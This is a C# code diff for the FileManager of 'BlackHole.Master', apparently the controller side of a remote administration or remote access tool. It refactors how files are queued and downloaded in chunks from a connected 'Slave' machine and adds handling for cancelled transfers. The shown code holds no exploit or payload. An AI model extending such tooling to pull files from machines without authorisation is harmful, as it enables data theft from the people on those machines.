@@ -52,7 +52,12 @@ namespace BlackHole.Master
         /// <summary>
         /// 
         /// </summary>
-        private Queue<string> m_pendingDownloads;
+        private Queue<FileDownload> m_pendingDownloads;
+
+        /// <summary>
+        /// 
+        /// </summary>
+        private bool m_downloading;
 
         /// <summary>
         /// 
@@ -60,7 +65,8 @@ namespace BlackHole.Master
         /// <param name="slave"></param>
         public FileManager(Slave slave) : this()
         {
-            m_pendingDownloads = new Queue<string>();
+            m_pendingDownloads = new Queue<FileDownload>();
+            m_downloading = false;
 
             Slave = slave;
 
@@ -88,9 +94,20 @@ namespace BlackHole.Master
         /// <param name="path"></param>
         private void DownloadFile(string name)
         {
-            m_pendingDownloads.Enqueue(name);
-            if (m_pendingDownloads.Count == 1)            
-                ProcessNextDownload();            
+            m_pendingDownloads.Enqueue(
+                CreateFileTransaction<FileDownload>(
+                    m_nextTransactionId++,
+                    Path.Combine(TxtBoxDirectory.Text, name)));        
+            ProcessNextDownload();            
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        private void FinishDownloading()
+        {
+            m_downloading = false;
+            ProcessNextDownload();
         }
 
         /// <summary>
@@ -98,15 +115,20 @@ namespace BlackHole.Master
         /// </summary>
         private void ProcessNextDownload()
         {
+            if (m_downloading)
+                return;
+            
             if (m_pendingDownloads.Count == 0)
                 return;
 
-            var name = m_pendingDownloads.Dequeue();
+            m_downloading = true;
+
+            var download = m_pendingDownloads.Dequeue();
             this.Send(new DownloadFilePartMessage()
             {
-                Id = m_nextTransactionId++,
+                Id = download.Id,
                 CurrentPart = 0,
-                Path = Path.Combine(TxtBoxDirectory.Text, name)
+                Path = download.FilePath
             });
         }
 
@@ -114,7 +136,7 @@ namespace BlackHole.Master
         /// 
         /// </summary>
         /// <param name="ev"></param>
-        public async void OnEvent(SlaveEvent ev)
+        public async Task OnEvent(SlaveEvent ev)
         {
             await this.ExecuteInDispatcher(() =>
             {
@@ -141,19 +163,29 @@ namespace BlackHole.Master
                             .With<DownloadedFilePartMessage>(m =>
                             {
                                 UpdateFileTransaction<FileDownload>(m,
+
+                                    // on finished, flush the file into the local directory
                                     (download) =>
                                     {
                                         var raw = download.RawFile.ToArray();
                                         Slave.SaveDownloadedFile(download.Name, raw);
                                         Slave.SlaveEvents.PostEvent(new SlaveEvent(SlaveEventType.FILE_DOWNLOADED, Slave, raw));
-                                        ProcessNextDownload();
+                                        FinishDownloading();
                                     },
-                                    (download) => this.Send(new DownloadFilePartMessage()
+
+                                    // on cancellation, try to download the next file
+                                    () => FinishDownloading(),
+
+                                    // if not completed, try to get the next chunck
+                                    (download) =>
                                     {
-                                        Id = download.Id,
-                                        Path = download.FilePath,
-                                        CurrentPart = m.CurrentPart + 1 // get the next chunck
-                                    }));
+                                        this.Send(new DownloadFilePartMessage()
+                                        {
+                                            Id = download.Id,
+                                            Path = download.FilePath,
+                                            CurrentPart = m.CurrentPart + 1 
+                                        });
+                                    });
                             })
                             .With<DownloadFilePartMessage>(m =>
                             {
@@ -166,6 +198,7 @@ namespace BlackHole.Master
                                             {
                                                 Slave.SlaveEvents.PostEvent(new SlaveEvent(SlaveEventType.FILE_UPLOADED, Slave, upload.FilePath));
                                             },
+                                            () => { },
                                             (upload) => this.Send(downloadedPart));                                        
                                     },
                                     (e) =>
@@ -192,22 +225,34 @@ namespace BlackHole.Master
         /// </summary>
         /// <typeparam name="T"></typeparam>
         /// <param name="part"></param>
-        private void UpdateFileTransaction<T>(DownloadedFilePartMessage part, Action<T> onCompleted, Action<T> onContinue)
+        private void UpdateFileTransaction<T>(DownloadedFilePartMessage part, Action<T> onCompleted, Action onCanceled, Action<T> onContinue)
             where T : FileTransaction, new()
         {
-            var model = FindOrCreateFileTransaction<T>(part);
-            model.UpdateTransaction(part);
-            if (model.Completed)
+            var model = FindFileTransaction<T>(part);
+
+            // transaction was prolly cancelled
+            if (model == null)
             {
-                onCompleted(model);
-
-                TotalTransaction.Content = "Total transactions : " + ++m_sucessfulTransactions;
-
-                // we delay the remove so we see small file downloads, otherwise it would be dropped instantly (download too fast)
-                Dispatcher.DelayInvoke(TimeSpan.FromMilliseconds(2000), () => ViewModelFileTransactions.Items.Remove(model));
+                onCanceled();
+                return;
             }
-            else
+
+            model.UpdateTransaction(part);
+
+            // transaction is completed, callback to continue
+            if (!model.Completed)
+            {
                 onContinue(model);
+                return;
+            }
+
+
+            onCompleted(model);
+
+            TotalTransaction.Content = "Total transactions : " + ++m_sucessfulTransactions;
+
+            // we delay the remove so we see small file downloads, otherwise it would be dropped instantly (download too fast)
+            Dispatcher.DelayInvoke(TimeSpan.FromMilliseconds(2000), () => ViewModelFileTransactions.Items.Remove(model));
         }
             
         /// <summary>
@@ -220,12 +265,25 @@ namespace BlackHole.Master
         {
             var model = FindFileTransaction<T>(part);
             if (model == null)
+                model = CreateFileTransaction<T>(part.Id, part.Path);
+            return model;
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <typeparam name="T"></typeparam>
+        /// <param name="partId"></param>
+        /// <param name="filePath"></param>
+        /// <returns></returns>
+        private T CreateFileTransaction<T>(int partId, string filePath) where T : FileTransaction, new()
+        {
+            var model = new T()
             {
-                model = new T();
-                model.Id = part.Id;
-                model.FilePath = part.Path;
-                ViewModelFileTransactions.Items.Add(model);
-            }
+                Id = partId,
+                FilePath = filePath
+            };
+            ViewModelFileTransactions.Items.Add(model);
             return model;
         }
 
